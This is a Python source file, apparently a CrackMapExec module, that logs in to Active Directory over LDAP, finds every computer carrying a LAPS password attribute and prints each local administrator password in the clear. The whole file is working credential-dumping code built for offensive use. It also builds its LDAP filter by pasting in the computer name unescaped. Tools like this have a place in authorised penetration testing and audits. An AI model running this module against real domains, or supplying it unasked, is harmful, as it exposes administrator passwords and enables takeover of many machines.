#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from impacket.ldap import ldapasn1 as ldapasn1_impacket


class CMEModule:
    '''
      Module by technobro refactored by @mpgn (now compatible with LDAP protocol + filter by computer)

      Initial module:
      @T3KX: https://github.com/T3KX/Crackmapexec-LAPS

      Credit: @n00py1
        Reference: https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/
        https://github.com/n00py/LAPSDumper
    '''

    name = 'laps'
    description = 'Retrieves the LAPS passwords'
    supported_protocols = ['ldap']
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """
            COMPUTER    Computer name or wildcard ex: WIN-S10, WIN-* etc. Default: *
        """

        self.computer = None
        if 'COMPUTER' in module_options:
            self.computer = module_options['COMPUTER']

    def on_login(self, context, connection):
        context.log.info('Getting LAPS Passwords')
        if self.computer is not None:
            searchFilter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(name=' + self.computer + '))'
        else:
            searchFilter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))'
        attributes = ['ms-MCS-AdmPwd', 'sAMAccountName']
        results = connection.search(searchFilter, attributes, 10000)
        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]

        laps_computers = []
        for computer in results:
            msMCSAdmPwd = ''
            sAMAccountName = ''
            values = {str(attr['type']).lower(): str(attr['vals'][0]) for attr in computer['attributes']}
            laps_computers.append((values['samaccountname'], values['ms-mcs-admpwd']))

        laps_computers = sorted(laps_computers, key=lambda x: x[0])
        for sAMAccountName, msMCSAdmPwd in laps_computers:
            context.log.highlight("Computer: {:<20} Password: {}".format(sAMAccountName, msMCSAdmPwd))
